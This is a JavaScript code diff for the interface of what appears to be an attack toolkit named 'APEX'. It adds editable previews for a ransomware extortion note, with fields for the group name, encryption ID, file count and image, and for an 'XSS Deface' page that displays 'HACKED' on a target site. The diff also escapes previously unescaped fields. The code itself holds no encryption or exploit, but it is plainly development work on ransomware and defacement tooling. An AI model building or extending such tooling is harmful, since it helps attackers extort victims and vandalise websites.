@@ -764,10 +764,19 @@ function loadSafetyStatus() {
 }
 
 // ============================================================
-// PREVIEW MODALS
+// EDITABLE PREVIEW MODALS
 // ============================================================
-function openPreviewModal(title, html) {
+var _previewType = ''; // 'ransomware' or 'deface'
+var _previewData = {};
+
+function openPreviewModal(title, html, type, data) {
+    _previewType = type || '';
+    _previewData = data || {};
     document.getElementById('previewModalTitle').textContent = title;
+    document.getElementById('previewEditBtn').style.display = 'inline-block';
+    document.getElementById('previewSaveBtn').style.display = 'none';
+    document.getElementById('editorPane').style.display = 'none';
+    document.getElementById('previewPane').style.display = 'block';
     var frame = document.getElementById('previewModalFrame');
     frame.srcdoc = html;
     document.getElementById('previewModal').classList.add('show');
@@ -776,6 +785,121 @@ function openPreviewModal(title, html) {
 function closePreviewModal() {
     document.getElementById('previewModal').classList.remove('show');
     document.getElementById('previewModalFrame').srcdoc = 'about:blank';
+    _previewType = '';
+    _previewData = {};
+}
+
+function togglePreviewEdit() {
+    var editorPane = document.getElementById('editorPane');
+    var previewPane = document.getElementById('previewPane');
+    var editBtn = document.getElementById('previewEditBtn');
+    var saveBtn = document.getElementById('previewSaveBtn');
+    
+    if (editorPane.style.display === 'none') {
+        // Switch to edit mode
+        editorPane.style.display = 'block';
+        previewPane.style.display = 'none';
+        editBtn.style.display = 'none';
+        saveBtn.style.display = 'inline-block';
+        buildEditorFields();
+    } else {
+        // Switch back to preview
+        editorPane.style.display = 'none';
+        previewPane.style.display = 'block';
+        editBtn.style.display = 'inline-block';
+        saveBtn.style.display = 'none';
+    }
+}
+
+function buildEditorFields() {
+    var fields = document.getElementById('editorFields');
+    var html = '';
+    
+    if (_previewType === 'ransomware') {
+        html += '<label>Title</label>';
+        html += '<input type="text" id="editRansomTitle" value="' + escapeHtml(_previewData.title || 'YOUR FILES HAVE BEEN ENCRYPTED') + '">';
+        html += '<label>Message</label>';
+        html += '<textarea id="editRansomMsg" rows="6">' + escapeHtml(_previewData.message || 'All your files have been encrypted.') + '</textarea>';
+        html += '<label>Image URL</label>';
+        html += '<input type="text" id="editRansomImg" value="' + escapeHtml(_previewData.image_url || '') + '" placeholder="https://i.imgur.com/xxx.png">';
+        html += '<label>Group Name</label>';
+        html += '<input type="text" id="editRansomGroup" value="' + escapeHtml(_previewData.group_name || 'APEX') + '">';
+        html += '<label>Encryption ID</label>';
+        html += '<input type="text" id="editRansomEncId" value="' + escapeHtml(_previewData.encryption_id || 'APX-XXXX') + '">';
+        html += '<label>File Count</label>';
+        html += '<input type="text" id="editRansomFiles" value="' + escapeHtml(_previewData.file_count || '1,247') + '">';
+        html += '<label>Total Size</label>';
+        html += '<input type="text" id="editRansomSize" value="' + escapeHtml(_previewData.total_size || '45.3 MB') + '">';
+    } else if (_previewType === 'deface') {
+        html += '<label>Message</label>';
+        html += '<textarea id="editDefaceMsg" rows="6">' + escapeHtml(_previewData.message || 'This site has been compromised.') + '</textarea>';
+        html += '<label>Image URL</label>';
+        html += '<input type="text" id="editDefaceImg" value="' + escapeHtml(_previewData.image_url || '') + '" placeholder="https://i.imgur.com/xxx.png">';
+        html += '<label>Target URL</label>';
+        html += '<input type="text" id="editDefaceTarget" value="' + escapeHtml(_previewData.target_url || 'https://example.com') + '">';
+    }
+    
+    fields.innerHTML = html;
+}
+
+function savePreviewEdits() {
+    if (_previewType === 'ransomware') {
+        var data = {
+            title: document.getElementById('editRansomTitle').value,
+            message: document.getElementById('editRansomMsg').value,
+            image_url: document.getElementById('editRansomImg').value,
+            group_name: document.getElementById('editRansomGroup').value,
+            encryption_id: document.getElementById('editRansomEncId').value,
+            file_count: document.getElementById('editRansomFiles').value,
+            total_size: document.getElementById('editRansomSize').value
+        };
+        _previewData = data;
+        
+        fetch('/api/ransomware/preview', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(data)
+        }).then(function(r) { return r.json(); }).then(function(d) {
+            // Update preview
+            document.getElementById('previewModalFrame').srcdoc = d.html;
+            // Switch back to preview
+            document.getElementById('editorPane').style.display = 'none';
+            document.getElementById('previewPane').style.display = 'block';
+            document.getElementById('previewEditBtn').style.display = 'inline-block';
+            document.getElementById('previewSaveBtn').style.display = 'none';
+            toast('Ransomware preview updated', 'success');
+        });
+    } else if (_previewType === 'deface') {
+        var data = {
+            message: document.getElementById('editDefaceMsg').value,
+            image_url: document.getElementById('editDefaceImg').value,
+            target_url: document.getElementById('editDefaceTarget').value
+        };
+        _previewData = data;
+        
+        var html = '<!DOCTYPE html><html><head><meta charset="UTF-8"><style>' +
+            '*{margin:0;padding:0;box-sizing:border-box;}' +
+            'body{background:#0a0a0a;color:#e5e5e5;font-family:\'Courier New\',monospace;display:flex;align-items:center;justify-content:center;min-height:100vh;text-align:center;}' +
+            '.deface-card{background:#0f0f0f;border:2px solid #f97316;padding:40px;max-width:600px;box-shadow:0 0 40px rgba(249,115,22,0.3);}' +
+            '.deface-title{font-size:36px;font-weight:900;color:#f97316;letter-spacing:6px;text-shadow:0 0 20px rgba(249,115,22,0.5);margin-bottom:20px;}' +
+            '.deface-msg{font-size:16px;color:#d4d4d4;line-height:1.8;margin-bottom:20px;}' +
+            '.deface-img{max-width:300px;max-height:200px;border:2px solid #f97316;margin:20px 0;}' +
+            '.deface-footer{font-size:12px;color:#6b7280;margin-top:20px;}' +
+            '</style></head><body><div class="deface-card">' +
+            '<div class="deface-title">🔺 HACKED</div>' +
+            '<div class="deface-msg">' + escapeHtml(data.message) + '</div>' +
+            (data.image_url ? '<img class="deface-img" src="' + escapeHtml(data.image_url) + '" alt="Deface">' : '') +
+            '<div class="deface-footer">APEX v3.0 // Security breach detected</div>' +
+            '</div></body></html>';
+        
+        document.getElementById('previewModalFrame').srcdoc = html;
+        // Switch back to preview
+        document.getElementById('editorPane').style.display = 'none';
+        document.getElementById('previewPane').style.display = 'block';
+        document.getElementById('previewEditBtn').style.display = 'inline-block';
+        document.getElementById('previewSaveBtn').style.display = 'none';
+        toast('Deface preview updated', 'success');
+    }
 }
 
 function previewRansomware() {
@@ -784,20 +908,22 @@ function previewRansomware() {
     var data = {};
     if (ransom) { try { data = JSON.parse(ransom); } catch(e) {} }
     
+    var payload = {
+        title: 'YOUR FILES HAVE BEEN ENCRYPTED',
+        message: data.message || 'All your files have been encrypted.',
+        image_url: data.image || '',
+        group_name: 'APEX',
+        encryption_id: 'APX-' + Date.now().toString(36).toUpperCase(),
+        file_count: '1,247',
+        total_size: '45.3 MB'
+    };
+    
     fetch('/api/ransomware/preview', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-            title: 'YOUR FILES HAVE BEEN ENCRYPTED',
-            message: data.message || 'All your files have been encrypted.',
-            image_url: data.image || '',
-            group_name: 'APEX',
-            encryption_id: 'APX-' + Date.now().toString(36).toUpperCase(),
-            file_count: '1,247',
-            total_size: '45.3 MB'
-        })
+        body: JSON.stringify(payload)
     }).then(function(r) { return r.json(); }).then(function(d) {
-        openPreviewModal('🔒 Ransomware Note Preview', d.html);
+        openPreviewModal('🔒 Ransomware Note Preview', d.html, 'ransomware', payload);
     });
 }
 
@@ -806,6 +932,12 @@ function previewDeface() {
     var deface = localStorage.getItem('apex_deface');
     var data = {};
     if (deface) { try { data = JSON.parse(deface); } catch(e) {} }
+    
+    var payload = {
+        message: data.message || 'This site has been compromised.',
+        image_url: data.image || '',
+        target_url: 'https://example.com'
+    };
     
     var html = '<!DOCTYPE html><html><head><meta charset="UTF-8"><style>' +
         '*{margin:0;padding:0;box-sizing:border-box;}' +
@@ -817,12 +949,12 @@ function previewDeface() {
         '.deface-footer{font-size:12px;color:#6b7280;margin-top:20px;}' +
         '</style></head><body><div class="deface-card">' +
         '<div class="deface-title">🔺 HACKED</div>' +
-        '<div class="deface-msg">' + (data.message || 'This site has been compromised.') + '</div>' +
-        (data.image ? '<img class="deface-img" src="' + data.image + '" alt="Deface">' : '') +
+        '<div class="deface-msg">' + escapeHtml(payload.message) + '</div>' +
+        (payload.image_url ? '<img class="deface-img" src="' + escapeHtml(payload.image_url) + '" alt="Deface">' : '') +
         '<div class="deface-footer">APEX v3.0 // Security breach detected</div>' +
         '</div></body></html>';
     
-    openPreviewModal('💉 XSS Deface Preview', html);
+    openPreviewModal('💉 XSS Deface Preview', html, 'deface', payload);
 }
 
 // ============================================================
